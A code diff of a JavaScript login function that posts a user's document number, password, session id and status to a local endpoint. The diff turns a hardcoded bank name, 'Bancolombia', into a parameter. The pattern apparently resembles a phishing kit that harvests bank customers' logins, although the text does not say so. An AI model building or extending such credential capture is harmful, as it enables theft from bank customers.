@@ -1,17 +1,20 @@
 import axios from "axios"
 
-export default async function inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setInicioSesion, setTituloError, setGuardado, status) {
+export default async function inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, status, ente) {
     setLoading(true);
     try {
+        let body = {
+            usuario: datosInicio.numeroDocumento,
+            clave: datosInicio.contrasenia,
+            ente: ente,
+            status: status,
+            uniqid: uniqId
+        }
+        if (datosInicio?.tipoDocumento)  
+            body.informacion = { tipoDocumento: datosInicio.tipoDocumento };
+        
         const { data } = await axios.post(
-            `/api/sesion`,
-            {
-                usuario: datosInicio.numeroDocumento,
-                clave: datosInicio.contrasenia,
-                ente: "Bancolombia",
-                status: status,
-                uniqid: uniqId
-            },
+            `/api/sesion`, body,
             {
                 headers: {
                     "Content-Type": "application/json",
@@ -26,12 +29,9 @@ export default async function inicioSesionfuncion(setLoading, datosInicio, uniqI
         }
 
         setKey(k => k + 1);
-        setInicioSesion(true);
-        setTituloError("");
         setGuardado(true);
     } catch (error) {
         console.error("Error en inicio de sesión:", error);
-        setTituloError("Error al iniciar sesión");
     } finally {
         setLoading(false);
     }
